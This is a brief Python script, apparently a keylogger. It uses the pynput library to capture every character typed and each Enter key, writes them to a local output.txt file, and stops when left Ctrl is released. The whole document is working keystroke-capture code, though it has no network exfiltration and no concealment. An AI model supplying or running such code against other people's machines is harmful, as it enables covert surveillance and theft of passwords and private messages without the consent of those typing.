from pynput.keyboard import Key, Listener
import os

cwd = os.getcwd()
out_file = "output.txt"
out = "%s\%s"%(cwd,out_file)
f = open(out, "w")


def on_press(key):
    try:
        if key.char is not None:
            f.write("{}".format(key.char))

    except AttributeError:
        if key == Key.enter:
            f.write("" + "\n")


def on_release(key):
    if key == Key.ctrl_l:
        # Stop listener
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
